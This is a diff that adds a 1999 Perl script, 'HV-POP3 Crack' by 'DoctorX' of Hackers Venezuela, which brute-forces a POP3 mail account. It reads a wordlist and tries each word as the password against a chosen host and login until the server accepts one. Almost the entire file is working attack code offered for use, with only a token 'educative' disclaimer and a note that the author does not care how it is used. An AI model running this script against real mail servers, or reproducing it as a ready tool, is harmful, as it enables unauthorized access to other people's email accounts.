@@ -1,0 +1,143 @@
+#!/usr/bin/perl 
+# HAckers Venezuela http://www.hven.com.ve
+# HV-POP3 Crack       07/06/99
+# By DoctorX   email: d0ct0r_x@hven.com.ve
+#
+# This Program make a Brute Force attack against the POP3 based in a
+# Dictionary File, only that you need is a valid account and a Big List of
+# Word.
+#
+# Tested on  Red Hat 5.2,6.0  Slackware 3.6 
+#
+# Fixes      : - update  POP3 Server to  Secure POP3
+#              - make a filtering of POP3 port(110)
+#              - Contact me :-)
+#
+# Nota : This Program was made for educative issues only
+#        We Don't Care for the Things that you do with it
+# 
+# Thanks to : Kliber       ....................... Hot Dog Manager :-)
+#             darkdeath    ....................... lainus Man :-P
+#             DunkelSeite  ....................... SuperWebMan alias Ulcera
+#             LabX         ....................... Exploits Box
+#             Kliberlandia ....................... HV-ZONE
+#             HVLAN        ....................... The Battle Zone
+#             Drake        ....................... LaQuemazon
+#             Cyber_Optik  ....................... ThioZhino
+#
+#       Excuse my Bad English
+#       Viva VENEZUELA!!!!!!!!!!!!!!!!!!!!!!!!
+
+system clear;
+
+use Socket; 
+$port = 110;
+$victima = $ARGV[0];
+$login = $ARGV[1];
+$archivo = $ARGV[2];
+if(@ARGV < 3) { &jeje;exit;}
+$linea = " ===============================================================\n";
+$mem1 = " Hackers Venezuela http://www.hven.com.ve\n";
+$mem2 = " HV-POP3 Crack 07/06/99\n";
+$mem3 = " by DoctorX email: d0ct0r_x\@\hven.com.ve\n";
+open (LISTA,"$archivo");
+$count = 0 ;
+while ($entrada = <LISTA>){
+chop $entrada;
+$count++;
+@nombres[$count] = $entrada ;
+}
+close(LISTA);
+$total_lista = $count;
+$verga = $count;
+print $linea;
+print $mem1;
+print $mem2;
+print $mem3;
+print $linea;
+$mem10 = " Total of Words : $count\n";
+$mem11 = " Brute Force Attack ......!\n";
+$mem4 = " User : $login\n";
+print $mem10;
+print $mem11;
+print $mem4;
+$verga--;
+print " Accounts : 1   The Rest : $verga  \n" ;
+print $linea;
+$contador = 1;
+for ($y=0;$y<=$count;$y++){
+$pass = @nombres[$y];
+$mem9 = "user $login\n";
+$mem8 = "pass $pass\n";
+
+$NETFD = &makeconn($victima, $port); 
+sysread $NETFD, $message,100 or die "error Can't Read Socket Socket:$!";
+send($NETFD,$mem9,0);
+sysread $NETFD, $message,100 or die "error Can't Read Socket:$!";
+send($NETFD,$mem8,0);
+sysread $NETFD, $message,3 or die "error Can't Read Socket:$!";
+ if($message eq "+OK"){ &refrescar($count,$y,$login) ; print " Account Cracked  login: $login \n"; print "                 
+pass : \"$pass\" :-)\n"; print $linea; exit;}
+ if($message eq " +O"){ print " Account not  Cracked login: $login \n"; print "                  pass : \"$pass\" :-)\n"; print
+$linea; exit;}
+ close $NETFD;
+$contador++;
+if($contador eq "6"){ $contador = 0; &refrescar($count,$y,$login);}
+ }
+print " Bad Milk  \"$login\" Account not Cracked!! :-(\n";
+print $linea;
+sub makeconn { 
+my ($host, $portname, $server, $pt,$pts, $proto, $servaddr); 
+$host = $_[0]; 
+$pt = $_[1];  
+$server = gethostbyname($host) or 
+die "gethostbyname: cannot locate host: $!";
+$pts = getservbyport($pt, 'tcp') or 
+die "getservbyname: cannot get port : $!"; 
+$proto = getprotobyname('tcp') or die " : $!"; 
+$servaddr = sockaddr_in($pt, $server); 
+socket(CONNFD, PF_INET, SOCK_STREAM, $proto); 
+connect(CONNFD, $servaddr) or die "connect : $!";
+return CONNFD; 
+ }
+
+sub jeje {
+my ($sal1,$sal2,$sal3,$sal4,$sal5);
+$sal1 = " Hackers Venezuela http://www.hven.com.ve \n";
+$sal2 = " HV-POP3 Crack 07/06/99\n";  
+$sal3 = " by DoctorX email: d0ct0r_x\@\hven.com.ve\n";
+$sal4 = " ===============================================================\n";
+$sal5 = " issue : perl hv-pop3 host  login  words_file\n";
+print $sal4;
+print $sal1;
+print $sal2;
+print $sal3;
+print $sal4;
+print $sal5;
+print $sal4;
+}
+sub refrescar {
+my ($sal1,$sal2,$sal3,$sal4,$sal5);
+system clear;
+$sal1 = " Hackers Venezuela http://www.hven.com.ve \n";
+$sal2 = " HV-POP3 Crack 07/06/99\n";  
+$sal3 = " by DoctorX email: d0ct0r_x\@\hven.com.ve\n";
+$sal4 = " ===============================================================\n";
+$total = $_[0];
+$intentos = $_[1];
+$account = $_[2];
+$restantes = $total - $intentos;
+$sal5 = " Words Probed : $intentos  ";
+$sal6 = " Less Words  : $restantes \n";
+$user = " User : $account\n";
+print $sal4;
+print $sal1;
+print $sal2;
+print $sal3;
+print $sal4;
+print $mem10,$mem11,$user;
+print $sal5;
+print $sal6;
+print $sal4;
+}
+
